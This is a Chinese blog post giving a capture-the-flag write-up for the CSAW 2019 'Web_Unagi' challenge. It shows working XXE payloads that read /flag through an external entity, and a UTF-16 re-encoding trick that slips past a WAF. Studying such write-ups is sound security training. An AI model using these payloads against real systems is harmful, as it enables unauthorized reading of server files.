---
title: '[CSAWQual 2019]Web_Unagi'
date: 2024-07-24 19:57:32
tags: xxe
categories: 刷题笔记
---

## [CSAWQual 2019]Web_Unagi（xxe）

打开页面，我们在upload模块里发现一个here链接

我们点击，提示了xml格式，我们可以猜测，这道题是xxe漏洞

![image-20240724200440973](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407242004078.png)

我们构造xml

<!--more-->

```
<?xml version='1.0'?>
<!DOCTYPE users [
<!ENTITY xxe SYSTEM "file:///flag" >]>
<users>
    <user>
        <username>bob</username>
        <password>passwd2</password>
        <name> Bob</name>
        <email>bob@fakesite.com</email>  
        <group>&xxe;</group>
    </user>
</users>
```

我们上传时，提示被拦截了

![image-20240724202418064](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407242024098.png)

我们转换编码绕过waf，改为utf-16

```
cat 1.xml | iconv -f utf8 -t utf-16 1.xml>2.xml
```

![image-20240724203632652](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407242036686.png)

嗯，有长度限制，我们观察user界面，发现还有个intro标签，我们加上

```
<?xml version = "1.0"?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "file:///flag" >
]>
<users>
    <user>
        <username>&xxe;</username>
        <password>&xxe;</password>
        <name>&xxe;</name>
        <email>&xxe;</email>  
        <group>&xxe;</group>
        <intro>&xxe;</intro>
    </user>
</users>
```

得到flag

![image-20240724203755837](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407242037878.png)
